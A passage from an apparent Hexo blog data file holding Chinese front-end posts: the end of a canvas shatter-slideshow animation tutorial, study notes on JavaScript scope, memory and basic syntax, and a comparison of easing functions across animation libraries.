class=\"line\">preloadImg(sourceArray,function(images)&#123;</span><br><span class=\"line\">    slide(images);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">// 执行动画</span><br><span class=\"line\">function slide(images) &#123;</span><br><span class=\"line\">    var image = images[index];</span><br><span class=\"line\">    imgWidth = image.width;</span><br><span class=\"line\">    imgHeight = image.height;</span><br><span class=\"line\"></span><br><span class=\"line\">    var vertices = getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio);</span><br><span class=\"line\">    var fragments = getFragments(vertices, image);</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    TweenMax.set(container, &#123;</span><br><span class=\"line\">        perspective: 500</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    var cvsArray = [];</span><br><span class=\"line\">    fragments.forEach(function (element, index) &#123;</span><br><span class=\"line\">        var fragmentCvs = element.canvas;</span><br><span class=\"line\">        cvsArray.push(fragmentCvs);</span><br><span class=\"line\">        container.appendChild(fragmentCvs);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    TweenMax.staggerFromTo(cvsArray, 0.2, &#123;</span><br><span class=\"line\">        opacity: 0,</span><br><span class=\"line\">        z: 100,</span><br><span class=\"line\">        scale: 2</span><br><span class=\"line\">    &#125;, &#123;</span><br><span class=\"line\">        opacity: 1,</span><br><span class=\"line\">        z: 0,</span><br><span class=\"line\">        scale: 1</span><br><span class=\"line\">    &#125;, 0.05, function()&#123;</span><br><span class=\"line\">        // 完成一幅后切换下一幅</span><br><span class=\"line\">        container.innerHTML = &apos;&apos;;</span><br><span class=\"line\">        index === sourceArray.length-1 ? index = 0 : index++;</span><br><span class=\"line\">        slide(images);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>大家也看到了，这只是一个示例，动画效果很粗糙，如果要实际使用还需要做很多工作。</p>\n<p>这也是我接下来要做的：</p>\n<p>1，碎片动画完成后增加完整图片的显示（没有裂纹效果）；</p>\n<p>2，性能优化，增加缓存，减少dom操作；</p>\n<p>3，细节优化，打包；</p>\n<p>4，完成一个标准的焦点图轮播组件。</p>"},{"title":"变量、作用域和内存问题（《JavaScript高级程序设计》）","date":"2018-12-20T00:48:36.000Z","updated":"2018-12-20T00:48:36.000Z","_content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n理解基本类型和引用类型的值，理解执行环境，理解垃圾收集\n<!-- more -->\n\n# 详述\n\n## 基本类型值和引用类型值的特点：\n1. 基本类型值在内存中占据固定大小的空间，因此被保存在栈内存中；\n2. 从一个变量向另一个变量复制基本类型的值，会创建这个值的一个副本；\n3. 引用类型的值是对象，保存在堆内存中；\n4. 包含引用类型值的变量实际上包含的并不是对象本身，而是一个指向该对象的指针；\n5. 从一个变量向另一个变量复制引用类型的值，复制的其实是指针，因此两个变量最终都指向同一个对象；\n6. 确定一个值是哪种基本类型可以使用typeof 操作符，而确定一个值是哪种引用类型可以使用instanceof 操作符。\n\n## 执行环境（作用域），总结如下：\n1. 执行环境有全局执行环境（也称为全局环境）和函数执行环境之分；\n2. 每次进入一个新执行环境，都会创建一个用于搜索变量和函数的作用域链；\n3. 函数的局部环境不仅有权访问函数作用域中的变量，而且有权访问其包含（父）环境，乃至全局环境；\n4. 全局环境只能访问在全局环境中定义的变量和函数，而不能直接访问局部环境中的任何数据；\n5. 变量的执行环境有助于确定应该何时释放内存。\n\n## 垃圾收集（自动回收），总结如下：\n1. 离开作用域的值将被自动标记为可以回收，因此将在垃圾收集期间被删除。\n2. “标记清除”是目前主流的垃圾收集算法，这种算法的思想是给当前不使用的值加上标记，然后再回收其内存。\n3. 另一种垃圾收集算法是“引用计数”，这种算法的思想是跟踪记录所有值被引用的次数。JavaScript引擎目前都不再使用这种算法；但在IE 中访问非原生JavaScript 对象（如DOM 元素）时，这种算法仍然可能会导致问题。\n4. 当代码中存在循环引用现象时，“引用计数”算法就会导致问题。\n5. 解除变量的引用不仅有助于消除循环引用现象，而且对垃圾收集也有好处。为了确保有效地回收内存，应该及时解除不再使用的全局对象、全局对象属性以及循环引用变量的引用。","source":"_posts/2018/2018-12-20-JS高设3版-4.md","raw":"---\ntitle: 变量、作用域和内存问题（《JavaScript高级程序设计》）\ntags:\n  - JavaScript\n  - 笔记\ncategories:\n  - 前端\ndate: 2018-12-20 08:48:36\nupdated: 2018-12-20 08:48:36\n---\n\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n理解基本类型和引用类型的值，理解执行环境，理解垃圾收集\n<!-- more -->\n\n# 详述\n\n## 基本类型值和引用类型值的特点：\n1. 基本类型值在内存中占据固定大小的空间，因此被保存在栈内存中；\n2. 从一个变量向另一个变量复制基本类型的值，会创建这个值的一个副本；\n3. 引用类型的值是对象，保存在堆内存中；\n4. 包含引用类型值的变量实际上包含的并不是对象本身，而是一个指向该对象的指针；\n5. 从一个变量向另一个变量复制引用类型的值，复制的其实是指针，因此两个变量最终都指向同一个对象；\n6. 确定一个值是哪种基本类型可以使用typeof 操作符，而确定一个值是哪种引用类型可以使用instanceof 操作符。\n\n## 执行环境（作用域），总结如下：\n1. 执行环境有全局执行环境（也称为全局环境）和函数执行环境之分；\n2. 每次进入一个新执行环境，都会创建一个用于搜索变量和函数的作用域链；\n3. 函数的局部环境不仅有权访问函数作用域中的变量，而且有权访问其包含（父）环境，乃至全局环境；\n4. 全局环境只能访问在全局环境中定义的变量和函数，而不能直接访问局部环境中的任何数据；\n5. 变量的执行环境有助于确定应该何时释放内存。\n\n## 垃圾收集（自动回收），总结如下：\n1. 离开作用域的值将被自动标记为可以回收，因此将在垃圾收集期间被删除。\n2. “标记清除”是目前主流的垃圾收集算法，这种算法的思想是给当前不使用的值加上标记，然后再回收其内存。\n3. 另一种垃圾收集算法是“引用计数”，这种算法的思想是跟踪记录所有值被引用的次数。JavaScript引擎目前都不再使用这种算法；但在IE 中访问非原生JavaScript 对象（如DOM 元素）时，这种算法仍然可能会导致问题。\n4. 当代码中存在循环引用现象时，“引用计数”算法就会导致问题。\n5. 解除变量的引用不仅有助于消除循环引用现象，而且对垃圾收集也有好处。为了确保有效地回收内存，应该及时解除不再使用的全局对象、全局对象属性以及循环引用变量的引用。","slug":"2018-2018-12-20-JS高设3版-4","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8qc0019wovvwkxbz7v0","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>理解基本类型和引用类型的值，理解执行环境，理解垃圾收集<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基本类型值和引用类型值的特点：\"><a href=\"#基本类型值和引用类型值的特点：\" class=\"headerlink\" title=\"基本类型值和引用类型值的特点：\"></a>基本类型值和引用类型值的特点：</h2><ol>\n<li>基本类型值在内存中占据固定大小的空间，因此被保存在栈内存中；</li>\n<li>从一个变量向另一个变量复制基本类型的值，会创建这个值的一个副本；</li>\n<li>引用类型的值是对象，保存在堆内存中；</li>\n<li>包含引用类型值的变量实际上包含的并不是对象本身，而是一个指向该对象的指针；</li>\n<li>从一个变量向另一个变量复制引用类型的值，复制的其实是指针，因此两个变量最终都指向同一个对象；</li>\n<li>确定一个值是哪种基本类型可以使用typeof 操作符，而确定一个值是哪种引用类型可以使用instanceof 操作符。</li>\n</ol>\n<h2 id=\"执行环境（作用域），总结如下：\"><a href=\"#执行环境（作用域），总结如下：\" class=\"headerlink\" title=\"执行环境（作用域），总结如下：\"></a>执行环境（作用域），总结如下：</h2><ol>\n<li>执行环境有全局执行环境（也称为全局环境）和函数执行环境之分；</li>\n<li>每次进入一个新执行环境，都会创建一个用于搜索变量和函数的作用域链；</li>\n<li>函数的局部环境不仅有权访问函数作用域中的变量，而且有权访问其包含（父）环境，乃至全局环境；</li>\n<li>全局环境只能访问在全局环境中定义的变量和函数，而不能直接访问局部环境中的任何数据；</li>\n<li>变量的执行环境有助于确定应该何时释放内存。</li>\n</ol>\n<h2 id=\"垃圾收集（自动回收），总结如下：\"><a href=\"#垃圾收集（自动回收），总结如下：\" class=\"headerlink\" title=\"垃圾收集（自动回收），总结如下：\"></a>垃圾收集（自动回收），总结如下：</h2><ol>\n<li>离开作用域的值将被自动标记为可以回收，因此将在垃圾收集期间被删除。</li>\n<li>“标记清除”是目前主流的垃圾收集算法，这种算法的思想是给当前不使用的值加上标记，然后再回收其内存。</li>\n<li>另一种垃圾收集算法是“引用计数”，这种算法的思想是跟踪记录所有值被引用的次数。JavaScript引擎目前都不再使用这种算法；但在IE 中访问非原生JavaScript 对象（如DOM 元素）时，这种算法仍然可能会导致问题。</li>\n<li>当代码中存在循环引用现象时，“引用计数”算法就会导致问题。</li>\n<li>解除变量的引用不仅有助于消除循环引用现象，而且对垃圾收集也有好处。为了确保有效地回收内存，应该及时解除不再使用的全局对象、全局对象属性以及循环引用变量的引用。</li>\n</ol>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>理解基本类型和引用类型的值，理解执行环境，理解垃圾收集<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基本类型值和引用类型值的特点：\"><a href=\"#基本类型值和引用类型值的特点：\" class=\"headerlink\" title=\"基本类型值和引用类型值的特点：\"></a>基本类型值和引用类型值的特点：</h2><ol>\n<li>基本类型值在内存中占据固定大小的空间，因此被保存在栈内存中；</li>\n<li>从一个变量向另一个变量复制基本类型的值，会创建这个值的一个副本；</li>\n<li>引用类型的值是对象，保存在堆内存中；</li>\n<li>包含引用类型值的变量实际上包含的并不是对象本身，而是一个指向该对象的指针；</li>\n<li>从一个变量向另一个变量复制引用类型的值，复制的其实是指针，因此两个变量最终都指向同一个对象；</li>\n<li>确定一个值是哪种基本类型可以使用typeof 操作符，而确定一个值是哪种引用类型可以使用instanceof 操作符。</li>\n</ol>\n<h2 id=\"执行环境（作用域），总结如下：\"><a href=\"#执行环境（作用域），总结如下：\" class=\"headerlink\" title=\"执行环境（作用域），总结如下：\"></a>执行环境（作用域），总结如下：</h2><ol>\n<li>执行环境有全局执行环境（也称为全局环境）和函数执行环境之分；</li>\n<li>每次进入一个新执行环境，都会创建一个用于搜索变量和函数的作用域链；</li>\n<li>函数的局部环境不仅有权访问函数作用域中的变量，而且有权访问其包含（父）环境，乃至全局环境；</li>\n<li>全局环境只能访问在全局环境中定义的变量和函数，而不能直接访问局部环境中的任何数据；</li>\n<li>变量的执行环境有助于确定应该何时释放内存。</li>\n</ol>\n<h2 id=\"垃圾收集（自动回收），总结如下：\"><a href=\"#垃圾收集（自动回收），总结如下：\" class=\"headerlink\" title=\"垃圾收集（自动回收），总结如下：\"></a>垃圾收集（自动回收），总结如下：</h2><ol>\n<li>离开作用域的值将被自动标记为可以回收，因此将在垃圾收集期间被删除。</li>\n<li>“标记清除”是目前主流的垃圾收集算法，这种算法的思想是给当前不使用的值加上标记，然后再回收其内存。</li>\n<li>另一种垃圾收集算法是“引用计数”，这种算法的思想是跟踪记录所有值被引用的次数。JavaScript引擎目前都不再使用这种算法；但在IE 中访问非原生JavaScript 对象（如DOM 元素）时，这种算法仍然可能会导致问题。</li>\n<li>当代码中存在循环引用现象时，“引用计数”算法就会导致问题。</li>\n<li>解除变量的引用不仅有助于消除循环引用现象，而且对垃圾收集也有好处。为了确保有效地回收内存，应该及时解除不再使用的全局对象、全局对象属性以及循环引用变量的引用。</li>\n</ol>"},{"title":"基本概念（《JavaScript高级程序设计》）","date":"2018-12-20T00:48:29.000Z","updated":"2018-12-20T00:48:29.000Z","_content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n了解语法、数据类型、流控制语句和函数\n<!-- more -->\n\n# 详述\n\n## 基础语法\n1. 区分大小写；\n2. 标识符：字母、下划线、美元符号和数字，首字母不能为数字；\n3. 注释：\n```js\n// 单行注释\n/*\n多行注释\n块级注释\n*/\n```\n4. 严格模式：加上\"use strict\"，单独脚本放在顶部，单独函数使用放在函数体第一行；\n5. 语句：分号`,`结尾，多条语句放到代码块中`{...}`；\n6. 关键字和保留字不用专门记，定义变量`var + 标识符`。\n\n## 数据类型\n1. 5种简单数据类型：Undefined、Null、Bollean、Number和String；1种复杂数据类型Object；\n2. typeof操作符返回值：\n    - \"undefined\"——未定义\n    - \"boolean\"——布尔值\n    - \"string\"——字符串\n    - \"number\"——数值\n    - \"object\"——对象或null\n    - \"function\"——函数\n3. 浮点数值存在精度问题：`0.1 + 0.2 != 0.3`；\n4. NaN，即非数值是一个特殊数值。两个特点：任何涉及NaN的操作都返回NaN，NaN与任何值都不相等，包括NaN本身。全局函数`isNaN()`判断不能转换为数值的值。\n5. 数值与字符串之间转换可加入基数的方法：`parseInt(\"10\", 8)`和`10.toString(8)`。\n6. Ojbect类型常用实例属性和方法：constructor、hasOwnProperty(propertyName)、isPrototypeOf(object)。\n\n## 操作符\n1. 递增和递减的前置型与后置型的区别：前置型先自增（减）再运算，后置型反之。\n2. `+`加号运算符可以拼接字符串。\n3. 不同类型变量间运算会自动类型转换。\n\n## 语句\n1. 熟悉if语句、do-while语句、while语句、for语句、for-in语句、label语句、break语句、continue语句、with语句和switch语句。\n2. switch语句特点：可以在switch语句中庸任何数据类型；每个case值可以是常量、变量和表达式。\n\n## 函数\n1. function定义，有作用域，参数个数及类型不定，没有重载。\n2. 没有重载的理解：函数是对象，函数名只是变量名，因为不存在参数个数及参数类型限制，所以后定义的覆盖先定义的，也就无所谓重载了。\n3. 可以通过`arguments`类数组对象来访问参数。","source":"_posts/2018/2018-12-20-JS高设3版-3.md","raw":"---\ntitle: 基本概念（《JavaScript高级程序设计》）\ntags:\n  - JavaScript\n  - 笔记  \ncategories:\n  - 前端\ndate: 2018-12-20 08:48:29\nupdated: 2018-12-20 08:48:29\n---\n\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n了解语法、数据类型、流控制语句和函数\n<!-- more -->\n\n# 详述\n\n## 基础语法\n1. 区分大小写；\n2. 标识符：字母、下划线、美元符号和数字，首字母不能为数字；\n3. 注释：\n```js\n// 单行注释\n/*\n多行注释\n块级注释\n*/\n```\n4. 严格模式：加上\"use strict\"，单独脚本放在顶部，单独函数使用放在函数体第一行；\n5. 语句：分号`,`结尾，多条语句放到代码块中`{...}`；\n6. 关键字和保留字不用专门记，定义变量`var + 标识符`。\n\n## 数据类型\n1. 5种简单数据类型：Undefined、Null、Bollean、Number和String；1种复杂数据类型Object；\n2. typeof操作符返回值：\n    - \"undefined\"——未定义\n    - \"boolean\"——布尔值\n    - \"string\"——字符串\n    - \"number\"——数值\n    - \"object\"——对象或null\n    - \"function\"——函数\n3. 浮点数值存在精度问题：`0.1 + 0.2 != 0.3`；\n4. NaN，即非数值是一个特殊数值。两个特点：任何涉及NaN的操作都返回NaN，NaN与任何值都不相等，包括NaN本身。全局函数`isNaN()`判断不能转换为数值的值。\n5. 数值与字符串之间转换可加入基数的方法：`parseInt(\"10\", 8)`和`10.toString(8)`。\n6. Ojbect类型常用实例属性和方法：constructor、hasOwnProperty(propertyName)、isPrototypeOf(object)。\n\n## 操作符\n1. 递增和递减的前置型与后置型的区别：前置型先自增（减）再运算，后置型反之。\n2. `+`加号运算符可以拼接字符串。\n3. 不同类型变量间运算会自动类型转换。\n\n## 语句\n1. 熟悉if语句、do-while语句、while语句、for语句、for-in语句、label语句、break语句、continue语句、with语句和switch语句。\n2. switch语句特点：可以在switch语句中庸任何数据类型；每个case值可以是常量、变量和表达式。\n\n## 函数\n1. function定义，有作用域，参数个数及类型不定，没有重载。\n2. 没有重载的理解：函数是对象，函数名只是变量名，因为不存在参数个数及参数类型限制，所以后定义的覆盖先定义的，也就无所谓重载了。\n3. 可以通过`arguments`类数组对象来访问参数。","slug":"2018-2018-12-20-JS高设3版-3","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8qg001cwovvy94xd1q6","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>了解语法、数据类型、流控制语句和函数<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基础语法\"><a href=\"#基础语法\" class=\"headerlink\" title=\"基础语法\"></a>基础语法</h2><ol>\n<li>区分大小写；</li>\n<li>标识符：字母、下划线、美元符号和数字，首字母不能为数字；</li>\n<li><p>注释：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 单行注释</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">多行注释</span></span><br><span class=\"line\"><span class=\"comment\">块级注释</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>严格模式：加上”use strict”，单独脚本放在顶部，单独函数使用放在函数体第一行；</p>\n</li>\n<li>语句：分号<code>,</code>结尾，多条语句放到代码块中<code>{...}</code>；</li>\n<li>关键字和保留字不用专门记，定义变量<code>var + 标识符</code>。</li>\n</ol>\n<h2 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h2><ol>\n<li>5种简单数据类型：Undefined、Null、Bollean、Number和String；1种复杂数据类型Object；</li>\n<li>typeof操作符返回值：<ul>\n<li>“undefined”——未定义</li>\n<li>“boolean”——布尔值</li>\n<li>“string”——字符串</li>\n<li>“number”——数值</li>\n<li>“object”——对象或null</li>\n<li>“function”——函数</li>\n</ul>\n</li>\n<li>浮点数值存在精度问题：<code>0.1 + 0.2 != 0.3</code>；</li>\n<li>NaN，即非数值是一个特殊数值。两个特点：任何涉及NaN的操作都返回NaN，NaN与任何值都不相等，包括NaN本身。全局函数<code>isNaN()</code>判断不能转换为数值的值。</li>\n<li>数值与字符串之间转换可加入基数的方法：<code>parseInt(&quot;10&quot;, 8)</code>和<code>10.toString(8)</code>。</li>\n<li>Ojbect类型常用实例属性和方法：constructor、hasOwnProperty(propertyName)、isPrototypeOf(object)。</li>\n</ol>\n<h2 id=\"操作符\"><a href=\"#操作符\" class=\"headerlink\" title=\"操作符\"></a>操作符</h2><ol>\n<li>递增和递减的前置型与后置型的区别：前置型先自增（减）再运算，后置型反之。</li>\n<li><code>+</code>加号运算符可以拼接字符串。</li>\n<li>不同类型变量间运算会自动类型转换。</li>\n</ol>\n<h2 id=\"语句\"><a href=\"#语句\" class=\"headerlink\" title=\"语句\"></a>语句</h2><ol>\n<li>熟悉if语句、do-while语句、while语句、for语句、for-in语句、label语句、break语句、continue语句、with语句和switch语句。</li>\n<li>switch语句特点：可以在switch语句中庸任何数据类型；每个case值可以是常量、变量和表达式。</li>\n</ol>\n<h2 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h2><ol>\n<li>function定义，有作用域，参数个数及类型不定，没有重载。</li>\n<li>没有重载的理解：函数是对象，函数名只是变量名，因为不存在参数个数及参数类型限制，所以后定义的覆盖先定义的，也就无所谓重载了。</li>\n<li>可以通过<code>arguments</code>类数组对象来访问参数。</li>\n</ol>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>了解语法、数据类型、流控制语句和函数<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基础语法\"><a href=\"#基础语法\" class=\"headerlink\" title=\"基础语法\"></a>基础语法</h2><ol>\n<li>区分大小写；</li>\n<li>标识符：字母、下划线、美元符号和数字，首字母不能为数字；</li>\n<li><p>注释：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 单行注释</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">多行注释</span></span><br><span class=\"line\"><span class=\"comment\">块级注释</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>严格模式：加上”use strict”，单独脚本放在顶部，单独函数使用放在函数体第一行；</p>\n</li>\n<li>语句：分号<code>,</code>结尾，多条语句放到代码块中<code>{...}</code>；</li>\n<li>关键字和保留字不用专门记，定义变量<code>var + 标识符</code>。</li>\n</ol>\n<h2 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h2><ol>\n<li>5种简单数据类型：Undefined、Null、Bollean、Number和String；1种复杂数据类型Object；</li>\n<li>typeof操作符返回值：<ul>\n<li>“undefined”——未定义</li>\n<li>“boolean”——布尔值</li>\n<li>“string”——字符串</li>\n<li>“number”——数值</li>\n<li>“object”——对象或null</li>\n<li>“function”——函数</li>\n</ul>\n</li>\n<li>浮点数值存在精度问题：<code>0.1 + 0.2 != 0.3</code>；</li>\n<li>NaN，即非数值是一个特殊数值。两个特点：任何涉及NaN的操作都返回NaN，NaN与任何值都不相等，包括NaN本身。全局函数<code>isNaN()</code>判断不能转换为数值的值。</li>\n<li>数值与字符串之间转换可加入基数的方法：<code>parseInt(&quot;10&quot;, 8)</code>和<code>10.toString(8)</code>。</li>\n<li>Ojbect类型常用实例属性和方法：constructor、hasOwnProperty(propertyName)、isPrototypeOf(object)。</li>\n</ol>\n<h2 id=\"操作符\"><a href=\"#操作符\" class=\"headerlink\" title=\"操作符\"></a>操作符</h2><ol>\n<li>递增和递减的前置型与后置型的区别：前置型先自增（减）再运算，后置型反之。</li>\n<li><code>+</code>加号运算符可以拼接字符串。</li>\n<li>不同类型变量间运算会自动类型转换。</li>\n</ol>\n<h2 id=\"语句\"><a href=\"#语句\" class=\"headerlink\" title=\"语句\"></a>语句</h2><ol>\n<li>熟悉if语句、do-while语句、while语句、for语句、for-in语句、label语句、break语句、continue语句、with语句和switch语句。</li>\n<li>switch语句特点：可以在switch语句中庸任何数据类型；每个case值可以是常量、变量和表达式。</li>\n</ol>\n<h2 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h2><ol>\n<li>function定义，有作用域，参数个数及类型不定，没有重载。</li>\n<li>没有重载的理解：函数是对象，函数名只是变量名，因为不存在参数个数及参数类型限制，所以后定义的覆盖先定义的，也就无所谓重载了。</li>\n<li>可以通过<code>arguments</code>类数组对象来访问参数。</li>\n</ol>"},{"title":"JS动画（二）——缓动函数分析及动画库","date":"2018-04-09T09:45:27.000Z","updated":"2018-08-07T00:36:16.000Z","_content":"上一篇讲了JS动画定时器相关知识，这一篇介绍下缓动函数及流行的动画库。\n## 熟悉的图 ##\n\n![clipboard.png](easingFunction.png)\n## 实际使用 ##\njquery animate()+[jquery.easing插件][1]的使用：\n\n```\n$(selector).animate(styles,speed,easing,callback)\n```\n原生js使用：\n[张鑫旭同学的文章][2]\n## 缓动函数知识 ##\n什么是缓动函数？我的理解是动画参数与数学公式结合的函数。\n\n各流行库缓动函数对比，以easeInQuad为例，如图：\n\n**[Tween.js][3]**\n\n![clipboard.png](tweenjs.png)\n\n**[jQuery.easing][4]**\n\n![clipboard.png](jqueryEasing.png)\n\n**[GSAP][5]**\n\n![clipboard.png](gsap.png)\n\n**[CreateJS][6]**\n\n![clipboard.png](creatJs.png)\n\n[Kute.js][7]\n```\n  easingFn.easingQuadraticIn = function (t) { return t*t; };\n```\n### 分析对比结果\n基本数学公式是一样的，都是2次方；\n缓动函数是独立的，与平台载体无关；\n缓动函数反应的是动画进程与数值变化量的对应关系，具体分析如下：\n\n[GSAP Ease在线示例][8]，动画进程每增加一格，数值变化量是增加量是越来越大的，效果就是由慢到快。\n![clipboard.png](greensockEase.png)\n\n与定时器无关，具体演变代码分析如下：\n左侧演示的是，由于算法二次方，进程每次等量增加1/5，但是变化量却越来越大；右侧演示的是，虽然定时器改变了（间隔减小一倍，由“滴答”执行五次改成十次），但是变化量的趋势是一样的，相同的进程增量，对应的变化量也是相同。\n![clipboard.png](yansuan.png)\n\n## 动画库\n\n动画库做的事基本就是一下四点：1，定时器；2，各种属性变量处理的封装；3，过程控制；4，缓动函数。\n\n实际运用中还是推荐大家用动画库，不满足业务需求的可以自己整合，当然学习的时候可以找个简单的读下源码，试着自己写下核心功能，深入理解动画库的本质，入门我推荐**Kute.js**。\n\n## 动画库推荐（各自优劣势及区别下次再详述）\n[jquery animate(插件jquery.easing.js)][9]\n[Tween.js][10]\n[GSAP][11]\t\n[CreateJS][12]\n[Kute.js][13]\n\t\n\n\n  [1]: http://gsgd.co.uk/sandbox/jquery/easing/\n  [2]: http://www.zhangxinxu.com/study/201612/how-to-use-tween-js.html\n  [3]: https://github.com/tweenjs/tween.js/blob/master/src/Tween.js\n  [4]: http://gsgd.co.uk/sandbox/jquery/easing/\n  [5]: https://greensock.com\n  [6]: https://github.com/CreateJS/TweenJS/blob/master/src/tweenjs/Ease.js\n  [7]: http://thednp.github.io/kute.js/\n  [8]: https://greensock.com/docs/Easing\n  [9]: http://gsgd.co.uk/sandbox/jquery/easing/\n  [10]: https://github.com/tweenjs/tween.js\n  [11]: https://greensock.com\n  [12]: https://github.com/CreateJS\n  [13]: http://thednp.github.io/kute.js/","source":"_posts/2018/JS动画之缓动函数分析及动画库.md","raw":"---\ntitle: JS动画（二）——缓动函数分析及动画库\ntags:\n  - 动效\n  - JavaScript\ncategories:\n  - 前端\ndate: 2018-04-09 17:45:27\nupdated: 2018-08-07 08:36:16\n---\n上一篇讲了JS动画定时器相关知识，这一篇介绍下缓动函数及流行的动画库。\n## 熟悉的图 ##\n\n![clipboard.png](easingFunction.png)\n## 实际使用 ##\njquery animate()+[jquery.easing插件][1]的使用：\n\n```\n$(selector).animate(styles,speed,easing,callback)\n```\n原生js使用：\n[张鑫旭同学的文章][2]\n## 缓动函数知识 ##\n什么是缓动函数？我的理解是动画参数与数学公式结合的函数。\n\n各流行库缓动函数对比，以easeInQuad为例，如图：\n\n**[Tween.js][3]**\n\n![clipboard.png](tweenjs.png)\n\n**[jQuery.easing][4]**\n\n![clipboard.png](jqueryEasing.png)\n\n**[GSAP][5]**\n\n![clipboard.png](gsap.png)\n\n**[CreateJS][6]**\n\n![clipboard.png](creatJs.png)\n\n[Kute.js][7]\n```\n  easingFn.easingQuadraticIn = function (t) { return t*t; };\n```\n### 分析对比结果\n基本数学公式是一样的，都是2次方；\n缓动函数是独立的，与平台载体无关；\n缓动函数反应的是动画进程与数值变化量的对应关系，具体分析如下：\n\n[GSAP Ease在线示例][8]，动画进程每增加一格，数值变化量是增加量是越来越大的，效果就是由慢到快。\n![clipboard.png](greensockEase.png)\n\n与定时器无关，具体演变代码分析如下：\n左侧演示的是，由于算法二次方，进程每次等量增加1/5，但是变化量却越来越大；右侧演示的是，虽然定时器改变了（间隔减小一倍，由“滴答”执行五次改成十次），但是变化量的趋势是一样的，相同的进程增量，对应的变化量也是相同。\n![clipboard.png](yansuan.png)\n\n## 动画库\n\n动画库做的事基本就是一下四点：1，定时器；2，各种属性变量处理的封装；3，过程控制；4，缓动函数。\n\n实际运用中还是推荐大家用动画库，不满足业务需求的可以自己整合，当然学习的时候可以找个简单的读下源码，试着自己写下核心功能，深入理解动画库的本质，入门我推荐**Kute.js**。\n\n## 动画库推荐（各自优劣势及区别下次再详述）\n[jquery animate(插件jquery.easing.js)][9]\n[Tween.js][10]\n[GSAP][11]\t\n[CreateJS][12]\n[Kute.js][13]\n\t\n\n\n  [1]: http://gsgd.co.uk/sandbox/jquery/easing/\n  [2]: http://www.zhangxinxu.com/study/201612/how-to-use-tween-js.html\n  [3]: https://github.com/tweenjs/tween.js/blob/master/src/Tween.js\n  [4]: http://gsgd.co.uk/sandbox/jquery/easing/\n  [5]: https://greensock.com\n  [6]: https://github.com/CreateJS/TweenJS/blob/master/src/tweenjs/Ease.js\n  [7]: http://thednp.github.io/kute.js/\n  [8]: https://greensock.com/docs/Easing\n  [9]: http://gsgd.co.uk/sandbox/jquery/easing/\n  [10]: https://github.com/tweenjs/tween.js\n  [11]: https://greensock.com\n  [12]: https://github.com/CreateJS\n  [13]: 